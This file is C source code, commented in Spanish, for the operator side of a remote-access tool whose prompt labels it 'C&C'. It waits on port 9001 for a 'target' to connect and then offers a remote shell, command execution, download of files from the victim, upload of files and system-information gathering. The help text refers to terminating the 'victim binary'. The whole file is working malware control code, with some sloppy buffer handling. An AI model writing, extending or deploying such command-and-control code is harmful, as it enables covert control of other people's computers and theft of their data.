#include <stdio.h> 
#include <stdlib.h> 
#include <sys/types.h> 
#include <stdbool.h>
#include <string.h>
#include <signal.h>
#include <netinet/in.h>  
#include <sys/socket.h>  
#include <unistd.h>
#include <arpa/inet.h> 
#include <libgen.h>
#include <locale.h>
#include <sys/stat.h>
#include "../src/base64.c"

//Arreglar upload

int serverSock;
int targetConn;

// Definiciones
#define SOCKBUFFER 2048

//Colores
const char *GREEN = "\033[0;32m\033[1m";
const char *end = "\033[0m\033[0m";
const char *RED = "\033[0;31m\033[1m";
const char *BLUE = "\033[0;34m\033[1m";
const char *YELLOW = "\033[0;33m\033[1m";
const char *PURLPLE = "\033[0;35m\033[1m";
const char *CYAN = "\033[0;36m\033[1m";
const char *GRAY = "\033[0;37m\033[1m";

// Prototipo
int mainFunction(int targetConn, char *clientIP, uint16_t clientPort);
int ReadAndSendFile(int targetConn, char *file, char *instruct);
int shell(int targetConn, char *clientIP, uint16_t clientPort);
int downloadFunc(char *command, int targetConn, char *ip); 
int writeAndDecodeData(char *data, char *file, char *ip);
int sndAndExecCmd(int targetConn, char *command);
int startServer();
void closeConection(int targetConn, char *command, size_t instructLen, char *clientIP, uint16_t clientPort);
void StartGetSysInfo(int targetConn, char *command);
void StartGetSysInfo(int targetConn, char *command);
void StartSending(int targetConn, char *instruct);
void checkStart(char *IPAddress);
void ctrlCHandler(int sig);
void helpPannel();
char* decodeSystemInformation(char *codedSysInfo);

void ctrlCHandler(int sig) {
    // Exit ctrl + c 
    printf("\n\n\t%s[!] %sSaliendo: Ctrl + C detectado... %s\n", RED, YELLOW, end);
    close(serverSock);
    exit(1);
}

void closeConection(int targetConn, char *command, size_t instructLen, char *clientIP, uint16_t clientPort){
    char formattedString1[50] = "";
    snprintf(formattedString1, sizeof(formattedString1), " %s-%u ", clientIP, clientPort);
    printf("\n\t%s[*>] %s Closing Connection to  %s ===> %s %s", YELLOW, RED, end, formattedString1, YELLOW); 
    send(targetConn, command, instructLen, 0);
    close(targetConn);
    close(serverSock);
}

void checkStart(char *IPAddress){
    char formed[SOCKBUFFER];
    snprintf(formed, SOCKBUFFER, "./DATA/%s", IPAddress);
    struct stat buffer;
    if (stat("./DATA", &buffer) != 0) {
        mkdir("./DATA", 0700); 
    }
    if (stat(formed, &buffer) != 0){
        mkdir(formed, 0700);   
    }
   
}

void helpPannel(){
    printf("\n\tAvailable Commands:\n\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] shell                 -> Enter Shell Mode \n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] exec <command>        -> Exec command in no shell mode\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] download <file>       -> Download file from target\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] q / exit              -> Exit the conection\n");
    printf("\t\t---------------------------------------------------------\n");
    printf("\t\t| [!>] q -y / exit -y        -> Terminate the conection (close victim binary)\n");
    printf("\t\t---------------------------------------------------------\n");

}

void StartSending(int targetConn, char *instruct){
    char *file = malloc(strlen(instruct) + 1); // Asigna memoria a 'file'
    char toReplace[] = "upload ";

    char *substr = strstr(instruct, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    ReadAndSendFile(targetConn, file, instruct);

}

int ReadAndSendFile(int targetConn, char *file, char *instruct){
    setlocale(LC_ALL, "en_US.UTF-8");

    FILE *ptr;
    // Abrimos el archivo en modo de lectura
    ptr = fopen(file, "rb");

    if (ptr == NULL) {
        printf("\n\t%s[!>]%s No se puede abrir el archivo.\n\n", RED, YELLOW); 
        //send(conn, "No se puede abrir el archivo.\n", strlen("No se puede abrir el archivo.\n"), 0);
        send(targetConn, "end\0", strlen("end\0"), 0);
        return 1;
    } 
    
    send(targetConn, instruct, strlen(instruct), 0); 
    char buffer[SOCKBUFFER];  // Búfer para leer desde el archivo

    // Inicializamos los búferes con valores nulos 
    memset(buffer, 0, sizeof(buffer));

    // Lee el archivo en búferes y codifícalo en Base64 antes de enviarlo
    size_t bytesRead;

    while ((bytesRead = fread(buffer, 1, SOCKBUFFER, ptr)) > 0) { 
        printf("%s\n", buffer);
        char *base64Encoded = base64_encode(buffer, strlen(buffer));

        send(targetConn, base64Encoded, strlen(base64Encoded), 0); 
        free(base64Encoded);  // Liberar la memoria asignada por base64_encode
    }

    // Cierra el archivo
    fclose(ptr); 
    sleep(0.3);
    send(targetConn, "end\0", strlen("end\0"), 0); 
    printf("\n\t%s[*>] %sFile Uploaded Successfully.\n\n", YELLOW, BLUE);
    return 0;
}

int sndAndExecCmd(int targetConn, char *command){
    char resp[SOCKBUFFER];
    // Enviar comando
    send(targetConn, command, strlen(command), 0);
    
    while (true) {
        recv(targetConn, resp, SOCKBUFFER, 0);
        if (strcmp(resp, "end\0") == 0){
            break;
            
        } else {
            printf("%s\n", resp);
            memset(resp, 0, SOCKBUFFER);

        }
    }
    memset(resp, 0, SOCKBUFFER);
    return 0;
}

int shell(int targetConn, char *clientIP, uint16_t clientPort){
    printf("\n\t%s[*>] %sEntering Shell Mode%s\n\n", YELLOW, BLUE, end);
    send(targetConn, "shell", strlen("shell"), 0);

    char command[255] = "";
    char resp[SOCKBUFFER];
    while (true) {
        
        printf("\n%s<*%s Shell %s* %s>: %s ", YELLOW, RED, YELLOW, clientIP, end);
        fgets(command, sizeof(command), stdin); 

        // Eliminar el carácter de nueva línea si está presente
        size_t command_len = strlen(command);
        if (command_len > 0 && command[command_len - 1] == '\n') {
            command[command_len - 1] = '\0';
        }

        // Enviar el mensaje:
        if (strcmp(command, "q") == 0){ 

            printf("\n\t%s[*>] %sExiting Shell mode\n\n%s", YELLOW, BLUE, end);
            send(targetConn, command, sizeof(command), 0);
            break;

        } else if (strstr(command, "exit") != NULL){ 
            printf("\n\t%s[!>] %s For exit shell mode type 'q'\n", RED, YELLOW);

        } else if (strlen(command) == 0){
            continue;
            //send(targetConn, ":", sizeof(command), 0); 
        } else{
            sndAndExecCmd(targetConn, command);
        }
    }    
    return 0;

}

int writeAndDecodeData(char *data, char *file, char *ip){
    char formed[100];
    char *base = basename(file);
    snprintf(formed, SOCKBUFFER, "./DATA/%s/%s", ip, base);
 
    FILE *fp;
    char* DecodedData = base64_decode(data); 

    fp = fopen(formed, "w");
    if (fp == NULL){
        printf("\n\tError Opening File..\n");
        return 1;
    }

    fprintf(fp ,"%s" ,DecodedData);
    fclose(fp);


    printf("\n\t%s[*>] %s File Downloaded Successfully Check ->%s %s\n\n", YELLOW, BLUE, YELLOW, formed, end); 
    return 0;
    
}

int downloadFunc(char *command, int targetConn, char *ip){
    //Variables necesarias
    char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
    char toReplace[] = "download ";

    char *substr = strstr(command, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    printf("\n\t%s[*>] %s Downloading file ->%s %s\n\n", YELLOW, BLUE, YELLOW, file, end);
    send(targetConn, command, strlen(command), 0);
    
    // Lógica para descargar archivos
    char recvData[SOCKBUFFER];  // Utilizamos un búfer para recibir datos
    char *downloadedData = NULL;
    size_t downloadedSize = 0;

    // Inicializamos el búfer con valores nulos para evitar problemas con strcat
    memset(recvData, 0, sizeof(recvData));

    while (true) {
        int bytesRead = recv(targetConn, recvData, SOCKBUFFER, 0);

        if (bytesRead <= 0) {
            // Manejo de error de recepción
            printf("Error en la recepción de datos.\n");
            free(downloadedData);
            free(file);
            return 1;
        }

        if (strstr(recvData, "end\0") != NULL) { 
            // Recibido el indicador de final "end\0"
            break;
        } else { 
            // Añadir los datos recibidos al búfer de descarga
            char *temp = realloc(downloadedData, downloadedSize + bytesRead);
            if (temp == NULL) {
                // Error de memoria
                free(downloadedData);
                free(file);
                return 1;
            }
            downloadedData = temp;
            memcpy(downloadedData + downloadedSize, recvData, bytesRead);
            downloadedSize += bytesRead;
        }
    }

    writeAndDecodeData(downloadedData, file, ip);

    free(downloadedData);
    free(file);
    return 0;
}

char* getSystemInformation(int targetConn, char *command){
    send(targetConn, command, strlen(command), 0);
    char* recvData = malloc(SOCKBUFFER);

    while (true){
        recv(targetConn, recvData, SOCKBUFFER, 0);
        if (strstr(recvData, "end\0") == 0)
            break;
        else 
            printf("%s", recvData);
            continue;
        
    }

    return recvData;
}

char* decodeSystemInformation(char *codedSysInfo){
    char* decodedSystemInfo = base64_decode(codedSysInfo);
    return decodedSystemInfo;
}

void StartGetSysInfo(int targetConn, char *command){
    char *codedSysInfo = getSystemInformation(targetConn, command);
    printf("%s\n", decodeSystemInformation(codedSysInfo));

}

int mainFunction(int targetConn, char *clientIP, uint16_t clientPort){
    char command[255] = "";
    char resp[SOCKBUFFER];
    checkStart(clientIP);
    while (true){
        printf("%s<*%s C&C %s* %s>: %s ", YELLOW, RED, YELLOW, clientIP, end);
        fgets(command, sizeof(command), stdin); 

        // Eliminamos "\n" del final
        size_t instructLen = strlen(command);
        if (instructLen > 0 && command[instructLen -1] == '\n'){
            command[instructLen - 1] = '\0';
        }

        if (strcmp(command, "exit") == 0 || strcmp(command, "q") == 0){
            closeConection(targetConn, command, instructLen, clientIP, clientPort);
            break;
            
        } else if(strcmp(command, "exit -y") == 0 || strcmp(command, "q -y") == 0){
            closeConection(targetConn, command, instructLen, clientIP, clientPort);
            break;

        } else {
            // Panel de ayuda
            if (strcmp(command, "help") == 0){
                helpPannel(); 

            // Descargar un archivo    
            } else if (strstr(command, "download") != NULL)
                downloadFunc(command, targetConn, clientIP);
            
            else if (strcmp(command, "shell") == 0)
                shell(targetConn, clientIP, clientPort);
            
            else if (strstr(command, "exec") != NULL)
                sndAndExecCmd(targetConn, command);
                
            else if(strstr(command, "upload") != NULL)
                StartSending(targetConn, command);

            else if(strcmp(command, "sysinfo") == 0)
                StartGetSysInfo(targetConn, command);
                
            else 
                printf("\n\t%s[!>]%s Instruct Not Known...\n", RED, YELLOW);
            
        }
    }
}

int startServer(){

    // Creamos el socket del cliente
    serverSock = socket(AF_INET, SOCK_STREAM, 0);
    

    // Definimos el client addres
    struct sockaddr_in servAddr;

    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(9001);
    servAddr.sin_addr.s_addr = INADDR_ANY;

    // Escuchamos en la IP y puerto:
    bind(serverSock, (struct sockaddr*)&servAddr,
                sizeof(servAddr));

    // Escuchamos para conexiones
    listen(serverSock, 1);

    // Integer para mantener el socket cliente
    targetConn = accept(serverSock, NULL, NULL);

    // Obtenemos la dirección IP del cliente
    struct sockaddr_in clientAddr;
    socklen_t clientAddrLen = sizeof(clientAddr);
    getpeername(targetConn, (struct sockaddr*)&clientAddr, &clientAddrLen);

    char clientIP[INET_ADDRSTRLEN];  // String para almacenar la dirección IP
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, sizeof(clientIP));
    // Obtenemos el puerto del cliente
    uint16_t clientPort = ntohs(clientAddr.sin_port);

    printf("\t%s[>]%s New Connection From: %s %s-%u\n\n", YELLOW, RED, end, clientIP, clientPort);

    mainFunction(targetConn, clientIP, clientPort);
    

}

int main(int argc, char const* argv[]){
    // Atrapamos ctrl + c 
    if (signal(SIGINT, ctrlCHandler) == SIG_ERR) {
        perror("Error al configurar el manejador de señales");
        exit(EXIT_FAILURE);
    }

    printf("%s\n[!>] %sWaiting For target to connect...%s\n\n", YELLOW, RED, end); 
    startServer();
    return 0;

}
